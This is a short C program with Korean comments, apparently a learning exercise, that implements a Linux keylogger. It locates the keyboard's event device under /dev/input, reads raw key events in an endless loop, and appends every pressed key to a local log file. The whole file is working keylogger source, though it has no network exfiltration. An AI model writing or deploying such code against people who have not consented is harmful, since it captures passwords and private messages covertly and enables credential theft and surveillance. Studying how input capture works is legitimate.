#include "keymap.h"
#include <linux/input.h>
#include <stdio.h>
#include <string.h>

int main() {
  FILE *fp;
  FILE *lf;
  FILE *dev;
  char inputfile[100];
  struct input_event event;
  /*
  input_event 구조체는 #include <linux/input.h>에서 확인 할 수 있다.

  struct input_event {
    __u16 type;
    __u16 code;
    __s32 value;
  };
  */

  // 입력 디바이스 입력 파일 경로 찾기
  dev = popen("readlink -f /dev/input/by-path/$(ls /dev/input/by-path/ "
              "2>/dev/null | grep kbd)",
              "r");

  if (dev == NULL) {
    perror("readlink 실패.\n");
    return -1;
  }

  fgets(inputfile, 99, dev);
  inputfile[strlen(inputfile) - 1] = '\0';
  pclose(dev);

  // 입력 파일 열기
  fp = fopen(inputfile, "r");
  if (fp == NULL) {
    perror("inputfile 열기 실패.\n");
    return -1;
  }

  // 로그 파일 생성 및 열기
  lf = fopen("log", "a");
  if (lf == NULL) {
    perror("log 파일 열기 실패.\n");
    return -1;
  }

  // 입력 이벤트를 읽고 로깅
  while (1) {
    fread(&event, sizeof(event), 1, fp);
    if (event.type == EV_KEY && event.value == 1) {
      fprintf(lf, "%s", keymap[event.code]);
      fflush(lf);
    }
  }

  fclose(fp);
  fclose(lf);
}
